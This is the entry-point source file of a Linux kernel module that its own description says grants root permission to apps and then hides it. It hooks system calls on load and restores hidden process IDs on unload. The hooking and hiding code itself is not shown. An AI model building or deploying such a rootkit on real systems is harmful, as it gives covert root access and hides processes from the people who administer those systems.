#include <linux/module.h>
#include <linux/kernel.h>
#include "hooks.h"
#include "process.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Bot-wxt1221");
MODULE_DESCRIPTION("Grand root permission for apps then hide it.");
MODULE_VERSION("0.01");

static int __init lkm_example_init(void){
  printk(KERN_INFO "Hello!");
  my_hook_syscall();
  return 0;
}

static void __exit lkm_example_exit(void){
  printk(KERN_INFO "Hello!2");
  recover_hide_pid_all();
  my_unregister_hook_syscall();
  return ;
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
